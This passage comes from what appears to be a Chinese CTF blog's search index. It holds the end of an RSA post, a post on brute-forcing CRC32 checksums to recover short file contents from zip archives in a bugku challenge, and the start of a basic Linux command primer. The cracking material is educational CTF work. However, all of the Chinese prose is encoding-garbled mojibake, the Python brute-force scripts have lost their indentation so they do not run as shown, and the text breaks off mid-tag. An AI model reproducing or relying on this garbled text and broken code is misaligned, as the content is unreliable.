e</p><p>å‚è€ƒæ–‡ç« :<br><a href="http://www.freebuf.com/column/148185.html" target="_blank" rel="noopener">http://www.freebuf.com/column/148185.html</a><br><a href="http://skysec.top/2017/07/25/RSAå¸¸ç”¨å·¥å…·/" target="_blank" rel="noopener">http://skysec.top/2017/07/25/RSAå¸¸ç”¨å·¥å…·/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CRC32çˆ†ç ´å°ç»“</title>
      <link href="/CRC32-Brute.html"/>
      <url>/CRC32-Brute.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨bugkué‡åˆ°äº†ä¸€é“éšå†™é¢˜ï¼Œbinwalkä¹‹åå‘ç°é‡Œé¢æœ‰å¾ˆå¤šä¸ªå‹ç¼©åŒ…ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ç„¶åå°±æ— ä»ä¸‹æ‰‹ï¼Œäºæ˜¯æŸ¥çœ‹åˆ«äººå¤§ä½¬çš„wpæ‰å‘ç°æ˜¯CRC32çˆ†ç ´ï¼Œç”±äºæœ¬äººç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§é¢˜ç›®ï¼Œå°±è®°å½•ä¸€ä¸‹å§ã€‚ã€‚</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h4 id="CRCæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œå®ƒçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒ-Cyclic-Redundancy-Check-CRC-ï¼Œç”¨æ¥æ ¡éªŒæ–‡ä»¶æ˜¯å¦å‡ºé”™ä½†å¹¶ä¸èƒ½ç”¨äºè‡ªåŠ¨çº é”™ã€‚ã€‚emmmmï¼Œè®¡ç»„ä¸Šè¯¾å¥½åƒè®²è¿‡ï¼Œè€å¸ˆè®©æˆ‘ä»¬å›å»è‡ªå·±å­¦ï¼Œè®°å¾—å½“æ—¶åªæ˜¯åˆç•¥äº†è§£äº†ä¸€ä¸‹ï¼Œå°±æ˜¯åœ¨åé¢åŠ ä¸Šä¸€å°æ®µå†—ä½™ä½å»æ£€æµ‹ï¼Œè¯¦ç»†è§„åˆ™è°·æ­Œä¸€ä¸‹å§ã€‚ã€‚ã€‚ã€‚"><a href="#CRCæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œå®ƒçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒ-Cyclic-Redundancy-Check-CRC-ï¼Œç”¨æ¥æ ¡éªŒæ–‡ä»¶æ˜¯å¦å‡ºé”™ä½†å¹¶ä¸èƒ½ç”¨äºè‡ªåŠ¨çº é”™ã€‚ã€‚emmmmï¼Œè®¡ç»„ä¸Šè¯¾å¥½åƒè®²è¿‡ï¼Œè€å¸ˆè®©æˆ‘ä»¬å›å»è‡ªå·±å­¦ï¼Œè®°å¾—å½“æ—¶åªæ˜¯åˆç•¥äº†è§£äº†ä¸€ä¸‹ï¼Œå°±æ˜¯åœ¨åé¢åŠ ä¸Šä¸€å°æ®µå†—ä½™ä½å»æ£€æµ‹ï¼Œè¯¦ç»†è§„åˆ™è°·æ­Œä¸€ä¸‹å§ã€‚ã€‚ã€‚ã€‚" class="headerlink" title="CRCæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œå®ƒçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒ(Cyclic Redundancy Check, CRC)ï¼Œç”¨æ¥æ ¡éªŒæ–‡ä»¶æ˜¯å¦å‡ºé”™ä½†å¹¶ä¸èƒ½ç”¨äºè‡ªåŠ¨çº é”™ã€‚ã€‚emmmmï¼Œè®¡ç»„ä¸Šè¯¾å¥½åƒè®²è¿‡ï¼Œè€å¸ˆè®©æˆ‘ä»¬å›å»è‡ªå·±å­¦ï¼Œè®°å¾—å½“æ—¶åªæ˜¯åˆç•¥äº†è§£äº†ä¸€ä¸‹ï¼Œå°±æ˜¯åœ¨åé¢åŠ ä¸Šä¸€å°æ®µå†—ä½™ä½å»æ£€æµ‹ï¼Œè¯¦ç»†è§„åˆ™è°·æ­Œä¸€ä¸‹å§ã€‚ã€‚ã€‚ã€‚"></a>CRCæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œå®ƒçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒ(Cyclic Redundancy Check, CRC)ï¼Œç”¨æ¥æ ¡éªŒæ–‡ä»¶æ˜¯å¦å‡ºé”™ä½†å¹¶ä¸èƒ½ç”¨äºè‡ªåŠ¨çº é”™ã€‚ã€‚emmmmï¼Œè®¡ç»„ä¸Šè¯¾å¥½åƒè®²è¿‡ï¼Œè€å¸ˆè®©æˆ‘ä»¬å›å»è‡ªå·±å­¦ï¼Œè®°å¾—å½“æ—¶åªæ˜¯åˆç•¥äº†è§£äº†ä¸€ä¸‹ï¼Œå°±æ˜¯åœ¨åé¢åŠ ä¸Šä¸€å°æ®µå†—ä½™ä½å»æ£€æµ‹ï¼Œè¯¦ç»†è§„åˆ™è°·æ­Œä¸€ä¸‹å§ã€‚ã€‚ã€‚ã€‚</h4><p><a href="https://imgchr.com/i/CgsjPO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsjPO.md.png" alt="CgsjPO.md.png"></a></p><h4 id="è¿™é‡Œæˆ‘ä»¥ç ´è§£å››ä½CRCçš„å‹ç¼©åŒ…ä¸ºä¾‹ã€‚ã€‚ã€‚ã€‚å†™ä¸€ä¸ªç†è§£ä¹‹åçš„è„šæœ¬"><a href="#è¿™é‡Œæˆ‘ä»¥ç ´è§£å››ä½CRCçš„å‹ç¼©åŒ…ä¸ºä¾‹ã€‚ã€‚ã€‚ã€‚å†™ä¸€ä¸ªç†è§£ä¹‹åçš„è„šæœ¬" class="headerlink" title="è¿™é‡Œæˆ‘ä»¥ç ´è§£å››ä½CRCçš„å‹ç¼©åŒ…ä¸ºä¾‹ã€‚ã€‚ã€‚ã€‚å†™ä¸€ä¸ªç†è§£ä¹‹åçš„è„šæœ¬"></a>è¿™é‡Œæˆ‘ä»¥ç ´è§£å››ä½CRCçš„å‹ç¼©åŒ…ä¸ºä¾‹ã€‚ã€‚ã€‚ã€‚å†™ä¸€ä¸ªç†è§£ä¹‹åçš„è„šæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">dic=string.printable     <span class="comment">#å„ç§æ‰“å°å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">crc = <span class="string">'''ä½ çš„è¾“å…¥ '''</span>     <span class="comment"># è®°å¾—è¦ä»¥0xå¼€å¤´</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>è¦<strong>ç‰¹åˆ«æ³¨æ„</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:</span><br></pre></td></tr></table></figure><p>åœ¨ Python 2.x çš„ç‰ˆæœ¬ä¸­ï¼Œbinascii.crc32 æ‰€è®¡ç®—å‡ºä¾†çš„ CRC å€¼åŸŸä¸º[-2^31, 2^31-1] ä¹‹é—´çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œä¸ºäº†è¦ä¸ä¸€èˆ¬CRC ç»“æœä½œæ¯”å¯¹ï¼Œéœ€è¦å°†å…¶è½¬ä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥åŠ ä¸Š&amp; 0xffffffffæ¥è¿›è¡Œè½¬æ¢ã€‚å¦‚æœæ˜¯ Python 3.x çš„ç‰ˆæœ¬ï¼Œå…¶è®¡ç®—ç»“æœä¸º [0, 2^32-1] é—´çš„æ— ç¬¦å·æ•´æ•°ï¼Œå› æ­¤ä¸éœ€é¢å¤–åŠ ä¸Š&amp; 0xffffffff ã€‚</p><p>ä¸‹é¢å°±bugkué‚£é“å¤šä¸ªå‹ç¼©åŒ…ä¸ºä¾‹ï¼Œä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># def tansnum(s):</span></span><br><span class="line"><span class="comment">#     return int(s, 16)  è½¬åå…­è¿›åˆ¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic=string.printable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="comment">#return </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcrc32</span><span class="params">()</span>:</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">file = <span class="string">'out'</span> + str(b) + <span class="string">'.zip'</span></span><br><span class="line">f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">crc = GetCrc.CRC</span><br><span class="line">l.append(hex(crc))</span><br><span class="line"><span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment">#c = open('out.txt', 'w')</span></span><br><span class="line">l = getcrc32()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">   CrackCrc(i)</span><br><span class="line"><span class="comment">#c.close()</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸Šé¢çš„pythonæ“ä½œzipæ–‡ä»¶è¿˜ä¸å¤ªæ‡‚çš„è¯çœ‹çœ‹è¿™ä¸ª:(<a href="http://www.cnblogs.com/sun-haiyu/p/7082063.htmlï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ç”¨ZipFileè¯»å–æ–‡ä»¶ï¼Œç”¨getinfoå‡½æ•°è·å–ä¿¡æ¯ã€‚ã€‚ã€‚" target="_blank" rel="noopener">http://www.cnblogs.com/sun-haiyu/p/7082063.htmlï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ç”¨ZipFileè¯»å–æ–‡ä»¶ï¼Œç”¨getinfoå‡½æ•°è·å–ä¿¡æ¯ã€‚ã€‚ã€‚</a><br><strong>ç‰¹åˆ«æ³¨æ„</strong>ï¼Œä¸Šé¢çš„è„šæœ¬è·‘è¿™ä¸€é¢˜ååˆ†æ…¢ï¼Œæˆ‘è·‘äº†å·®ä¸å¤š40åˆ†é’Ÿéƒ½æ²¡è·‘å®Œã€‚ã€‚ã€‚æ•ˆç‡æä½ï¼Œæ‰€ä»¥å•Šæœ‰ç©ºæˆ‘è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹å¤šçº¿ç¨‹è¯¥æ€ä¹ˆè·‘ã€‚ã€‚ã€‚</p><h4 id="å¦å¤–è¿˜æœ‰ä¸€æ¬¾å¾ˆå¥½ç”¨çš„6ä½çš„CRC32çˆ†ç ´"><a href="#å¦å¤–è¿˜æœ‰ä¸€æ¬¾å¾ˆå¥½ç”¨çš„6ä½çš„CRC32çˆ†ç ´" class="headerlink" title="å¦å¤–è¿˜æœ‰ä¸€æ¬¾å¾ˆå¥½ç”¨çš„6ä½çš„CRC32çˆ†ç ´"></a>å¦å¤–è¿˜æœ‰ä¸€æ¬¾å¾ˆå¥½ç”¨çš„6ä½çš„CRC32çˆ†ç ´</h4><p>é™„ä¸Šç¥å™¨ï¼š(<a href="http://github.com/theonlypwner/crc32" target="_blank" rel="noopener">http://github.com/theonlypwner/crc32</a><br>å…·ä½“ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse ä½ çš„crc32å¯†æ–‡</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å¯†æ–‡è®°å¾—åŠ ä¸Š0xå˜æˆ16è¿›åˆ¶ã€‚ã€‚ã€‚å³å¯éå¸¸è¿…é€Ÿçš„çˆ†ç ´å‡ºå¯¹åº”çš„æ•°æ®ï¼Œä¸¾ä¸ªä¾‹å­</p><p><a href="https://imgchr.com/i/CgszxH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgszxH.md.png" alt="CgszxH.md.png"></a><br>è¿™é‡Œå°±æœ‰ç‚¹å“ˆè¥¿å†²çªçš„ä½“ç°äº†^_^</p><p>è¿™ä¸ªCRC32çˆ†ç ´ä¸€æ—¦è¶…è¿‡å…­ä½ï¼Œæˆ‘è§‰å¾—æ¯«æ— ç–‘ä¹‰ï¼Œæ¯•ç«Ÿå¯†ç è¶…è¿‡7ä½ä½ çˆ†ç ´éœ€è¦èŠ±å¾ˆé•¿çš„æ—¶é—´ï¼Œå¯¹äºè¿™ä¸ªä¹Ÿä¸€æ ·ã€‚ã€‚ã€‚ã€‚<br>è¿™å°±ä»å¦å¤–ä¸€ä¸ªè§’åº¦è¯ é‡Šäº†ä»€ä¹ˆå«æ— æ³•ç ´è§£çš„å¯†ç (#^.^#)ï¼Œè™½ç„¶è¿™ä¸€ä¸ªä¸œè¥¿ä¹Ÿä¼šå‡ºç°ç±»ä¼¼å“ˆå¸Œå†²çªçš„ç°è±¡ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>å‚è€ƒæ–‡ç« <br><a href="http://www.360zhijia.com/360anquanke/217342.html" target="_blank" rel="noopener">http://www.360zhijia.com/360anquanke/217342.html</a><br><a href="http://skysec.top/2017/06/19/CRCçˆ†ç ´æ€»ç»“/" target="_blank" rel="noopener">http://skysec.top/2017/06/19/CRCçˆ†ç ´æ€»ç»“/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CRC32çˆ†ç ´ </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç†Ÿæ‚‰Linuxå‘½ä»¤~~~</title>
      <link href="/Linux-learn.html"/>
      <url>/Linux-learn.html</url>
      <content type="html"><![CDATA[<p>å‘ç°è‡ªå·±å¯¹Linuxå‘½ä»¤ä¸å¤ªç†Ÿæ‚‰è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹å§<br><a id="more"></a></p><h1 id="åˆ†åŒºï¼šæŠŠå¤§ç¡¬ç›˜åˆ†ä¸ºå°çš„é€»è¾‘åˆ†åŒº"><a href="#åˆ†åŒºï¼šæŠŠå¤§ç¡¬ç›˜åˆ†ä¸ºå°çš„é€»è¾‘åˆ†åŒº" class="headerlink" title="åˆ†åŒºï¼šæŠŠå¤§ç¡¬ç›˜åˆ†ä¸ºå°çš„é€»è¾‘åˆ†åŒº"></a>åˆ†åŒºï¼šæŠŠå¤§ç¡¬ç›˜åˆ†ä¸ºå°çš„é€»è¾‘åˆ†åŒº</h1><h2 id="ç³»ç»Ÿåˆ†åŒº"><a href="#ç³»ç»Ÿåˆ†åŒº" class="headerlink" title="ç³»ç»Ÿåˆ†åŒº"></a>ç³»ç»Ÿåˆ†åŒº</h2><ol><li>ä¸»åˆ†åŒº æœ€å¤šåªèƒ½æœ‰å››ä¸ª</li><li>æ‰©å±•åˆ†åŒº æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ä¸»åˆ†åŒºå®¶æ‰©å±•åˆ†åŒºæœ€å¤šåªèƒ½æœ‰å››ä¸ªï¼Œä¸èƒ½å†™å…¥æ•°æ®ï¼Œåªèƒ½åŒ…å«é€»è¾‘åˆ†åŒº</li><li>é€»è¾‘åˆ†åŒº</li></ol><p>æ ¼å¼åŒ– ä¸ºäº†å†™å…¥æ–‡ä»¶ç³»ç»Ÿâ€¦.åœ¨linuxä¸­ä»»ä½•å†…å®¹éƒ½æ˜¯æ–‡ä»¶</p><p>ç¡¬ä»¶è®¾å¤‡æ–‡ä»¶å /dev/â€¦    ç¬¬ä¸€ä¸ªâ€™/â€˜ä»£è¡¨çš„æ˜¯æ ¹ç›®å½•ï¼Œdevç›®å½•ä¸‹ä¿å­˜çš„éƒ½æ˜¯ç¡¬ä»¶è®¾å¤‡æ–‡ä»¶å </p><p>æ ¹ç›®å½•ä¸‹çš„binå’Œsbinï¼Œusrç›®å½•ä¸‹çš„binå’Œsbinè¿™å››ä¸ªç›®å½•éƒ½æ˜¯ç”¨æ¥ä¿å­˜ç³»ç»Ÿå‘½ä»¤çš„<br>/etc/ ç›®å½•ä¸‹ä¸€èˆ¬éƒ½æ˜¯é…ç½®æ–‡ä»¶<br>/lib/  ç›®å½•ä¸‹ä¸€èˆ¬éƒ½æ˜¯Linuxçš„å‡½æ•°åº“<br>procå’Œsys ç›®å½•ä¸åº”è¯¥ æ“ä½œï¼Œè¿™ä¸¤ä¸ªç›®å½•ä¿å­˜çš„æ˜¯å†…å­˜å¾·è¿‡è½½ç‚¹<br>æ‰€ä»¥ä¸åº”è¯¥åœ¨Linuxä¸‹ä»»ä½•ä¸€ä¸ªæ–‡ä»¶å¤¹å†…ä¹±å†™ä¸œè¥¿ï¼Œå¯ä»¥åœ¨å®¶ç›®å½•rootæˆ–homeï¼Œä»¥åŠtempç›®å½•ä¸‹éšä¾¿æ”¾å†…å®¹</p><h1 id="æŒ‚è½½ï¼šç»™æ¯ä¸ªåˆ†åŒºåˆ†é…æŒ‚è½½ç‚¹â€“-gt-ç›¸å½“äºWindowsä¸‹çš„ç›˜ç¬¦"><a href="#æŒ‚è½½ï¼šç»™æ¯ä¸ªåˆ†åŒºåˆ†é…æŒ‚è½½ç‚¹â€“-gt-ç›¸å½“äºWindowsä¸‹çš„ç›˜ç¬¦" class="headerlink" title="æŒ‚è½½ï¼šç»™æ¯ä¸ªåˆ†åŒºåˆ†é…æŒ‚è½½ç‚¹â€“&gt;ç›¸å½“äºWindowsä¸‹çš„ç›˜ç¬¦"></a>æŒ‚è½½ï¼šç»™æ¯ä¸ªåˆ†åŒºåˆ†é…æŒ‚è½½ç‚¹â€“&gt;ç›¸å½“äºWindowsä¸‹çš„ç›˜ç¬¦</h1><h2 id="å¿…é¡»è¦æœ‰çš„åˆ†åŒº"><a href="#å¿…é¡»è¦æœ‰çš„åˆ†åŒº" class="headerlink" title="å¿…é¡»è¦æœ‰çš„åˆ†åŒº"></a>å¿…é¡»è¦æœ‰çš„åˆ†åŒº</h2><ol><li>â€˜/â€˜æ ¹åˆ†åŒº</li><li>swapåˆ†åŒº(äº¤æ¢åˆ†åŒºï¼Œå†…å­˜2å€ï¼Œä¸è¶…è¿‡2GBï¼Œç±»ä¼¼ä¸è™šæ‹Ÿå†…å­˜ï¼Œå†…å­˜ä¸å¤Ÿç”¨ï¼Œå¯ä»¥ç”¨é‡Œé¢çš„å½“å†…å­˜ä½¿ç”¨)</li><li>æ¨èåˆ†åŒº<br>/boot  (å¯åŠ¨åˆ†åŒºï¼Œ200MB)  è¿™ä¸ªå¯ä»¥ä¸å¼„ï¼Œåˆ°æ—¶æœ‰æ—¶å€™è¯¯åˆ çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´å¯åŠ¨ä¸äº†</li></ol><h1 id="å®‰è£…æ—¥å¿—"><a href="#å®‰è£…æ—¥å¿—" class="headerlink" title="å®‰è£…æ—¥å¿—"></a>å®‰è£…æ—¥å¿—</h1><p>/root/install.log å­˜å‚¨äº†å®‰è£…åœ¨ç³»ç»Ÿä¸­çš„è½¯ä»¶åŒ…åŠç‰ˆæœ¬ä¿¡æ¯<br>/root/install.log.syslog å­˜å‚¨äº†å®‰è£…è¿‡ç¨‹ä¸­ç•™ä¸‹çš„æ—¶é—´è®°å½•<br>/root/anaconda-ks.cfg ä»¥Kickstarté…ç½®æ–‡ä»¶çš„æ ¼å¼è®°å½•å®‰è£…è¿‡ç¨‹ä¸­çš„é€‰é¡¹ä¿¡æ¯</p><h1 id="Linuxå¸¸ç”¨å‘½ä»¤"><a href="#Linuxå¸¸ç”¨å‘½ä»¤" class="headerlink" title="Linuxå¸¸ç”¨å‘½ä»¤"></a>Linuxå¸¸ç”¨å‘½ä»¤</h1><h2 id="æ ¼å¼"><a href="#æ ¼å¼" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h2><p><strong>å‘½ä»¤ [é€‰é¡¹] [å‚æ•°]</strong></p><h2 id="ç»ˆç«¯å‡ ä¸ªç¬¦å·çš„è®¤è¯†"><a href="#ç»ˆç«¯å‡ ä¸ªç¬¦å·çš„è®¤è¯†" class="headerlink" title="ç»ˆç«¯å‡ ä¸ªç¬¦å·çš„è®¤è¯†"></a>ç»ˆç«¯å‡ ä¸ªç¬¦å·çš„è®¤è¯†</h2><ol><li>è¶…çº§ç”¨æˆ·æç¤ºç¬¦  <code>#</code></li><li>æ™®é€šç”¨æˆ·æç¤ºç¬¦  <code>$</code></li></ol><h2 id="ç›®å½•å¤„ç†å‘½ä»¤"><a href="#ç›®å½•å¤„ç†å‘½ä»¤" class="headerlink" title="ç›®å½•å¤„ç†å‘½ä»¤"></a>ç›®å½•å¤„ç†å‘½ä»¤</h2><h3 id="pwd-æ˜¾ç¤ºå½“å‰ç›®å½•"><a href="#pwd-æ˜¾ç¤ºå½“å‰ç›®å½•" class="headerlink" title="pwd æ˜¾ç¤ºå½“å‰ç›®å½•"></a><code>pwd</code> æ˜¾ç¤ºå½“å‰ç›®å½•</h3><h3 id="ls-l-å¯ä»¥çœ‹è§æƒé™"><a href="#ls-l-å¯ä»¥çœ‹è§æƒé™" class="headerlink" title="ls -l å¯ä»¥çœ‹è§æƒé™"></a><code>ls -l</code> å¯ä»¥çœ‹è§æƒé™</h3><p>æƒé™ä¸€å…±æœ‰åä½<br>ä¾‹å¦‚ <code>-rw-r--r--</code><br>-æ–‡ä»¶ç±»å‹  ï¼ˆ-æ–‡ä»¶ dç›®å½• Iè½¯è¿æ¥ï¼‰<br><code>rw-</code>    uæ‰€æœ‰è€…<br><code>r--</code>    gæ‰€å±ç»„<br><code>r--</code>     oå…¶ä»–äºº<br>rè¯» wå†™ xæ‰§è¡Œ</p><h3 id="å»ºç«‹ç›®å½•"><a href="#å»ºç«‹ç›®å½•" class="headerlink" title="å»ºç«‹ç›®å½•"></a>å»ºç«‹ç›®å½•</h3><p><code>mkdir -p [ç›®å½•å]</code>     make dictionary<br><code>-p</code> é€’å½’åˆ›å»º<br>å¦‚æœæ²¡æœ‰-påªèƒ½åˆ›å»ºå•ä¸ªç›®å½•ï¼Œè¦åˆ›å»ºä¸€ä¸²ç›®å½•åŠ -på³å¯</p><h3 id="åˆ‡æ¢æ‰€åœ¨ç›®å½•"><a href="#åˆ‡æ¢æ‰€åœ¨ç›®å½•" class="headerlink" title="åˆ‡æ¢æ‰€åœ¨ç›®å½•"></a>åˆ‡æ¢æ‰€åœ¨ç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd [ç›®å½•]</span><br></pre></td></tr></table></figure><p>ç®€åŒ–æ“ä½œ<br><code>cd ~</code> æˆ–è€… ç›´æ¥ä¸€ä¸ªcdè¿›å…¥å½“å‰ç”¨æˆ·çš„å®¶ç›®å½•<br><code>cd -</code> è¿›å…¥ä¸Šæ¬¡ç›®å½•<br><code>cd ..</code> è¿›å…¥ä¸Šçº§ç›®å½•<br><code>cd .</code> è¿›å…¥å½“å‰ç›®å½•<br><code>æ³¨æ„</code>å…¨éƒ¨å‘½ä»¤éƒ½æœ‰ç©ºæ ¼   </p><p><code>Ctrl+L</code>  æ¸…å±</p><h3 id="åˆ é™¤ç©ºç›®å½•"><a href="#åˆ é™¤ç©ºç›®å½•" class="headerlink" title="åˆ é™¤ç©ºç›®å½•"></a>åˆ é™¤ç©ºç›®å½•</h3><p><code>rmdir [ç›®å½•å]</code>    remove empty dictionary<br>æå…¶å°‘ç”¨</p><h3 id="åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•"><a href="#åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•" class="headerlink" title="åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•"></a>åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf</span><br></pre></td></tr></table></figure><p>é€‰é¡¹ <code>-r</code> åˆ é™¤ç›®å½•<br><code>-f</code> å¼ºåˆ¶</p><h3 id="å¤åˆ¶å‘½ä»¤"><a href="#å¤åˆ¶å‘½ä»¤" class="headerlink" title="å¤åˆ¶å‘½ä»¤"></a>å¤åˆ¶å‘½ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [é€‰é¡¹] [åŸæ–‡ä»¶æˆ–ç›®å½•] [ç›®æ ‡ç›®å½•]</span><br></pre></td></tr></table></figure><p><code>-r</code> å¤åˆ¶ç›®å½•<br><code>-p</code> è¿å¸¦æ–‡ä»¶å±æ€§å¤åˆ¶<br><code>-a</code> ç›¸å½“äº-pdr</p><h3 id="å‰ªåˆ‡æˆ–è€…æ”¹åå‘½ä»¤"><a href="#å‰ªåˆ‡æˆ–è€…æ”¹åå‘½ä»¤" class="headerlink" title="å‰ªåˆ‡æˆ–è€…æ”¹åå‘½ä»¤"></a>å‰ªåˆ‡æˆ–è€…æ”¹åå‘½ä»¤</h3><p><code>mv</code> [åŸæ–‡ä»¶æˆ–ç›®å½•] [ç›®æ ‡ç›®å½•]<br>åè¾¹ä¸¤ä¸ªå‚æ•°ä¸€æ ·å°±æ˜¯æ”¹ååŠŸèƒ½</p><h3 id="åˆ›å»ºæ–‡ä»¶"><a href="#åˆ›å»ºæ–‡ä»¶" class="headerlink" title="åˆ›å»ºæ–‡ä»¶"></a>åˆ›å»ºæ–‡ä»¶</h3><p><code>touch</code> æ–‡ä»¶å</p><h3 id="æ˜¾ç¤ºæ–‡ä»¶å†…å®¹"><a href="#æ˜¾ç¤ºæ–‡ä»¶å†…å®¹" class="headerlink" title="æ˜¾ç¤ºæ–‡ä»¶å†…å®¹"></a>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</h3><p><code>cat</code> æ–‡ä»¶å</p><h3 id="æ–‡ä»¶æœç´¢å‘½ä»¤"><a href="#æ–‡ä»¶æœç´¢å‘½ä»¤" class="headerlink" title="æ–‡ä»¶æœç´¢å‘½ä»¤"></a>æ–‡ä»¶æœç´¢å‘½ä»¤</h3><figure class="highlight 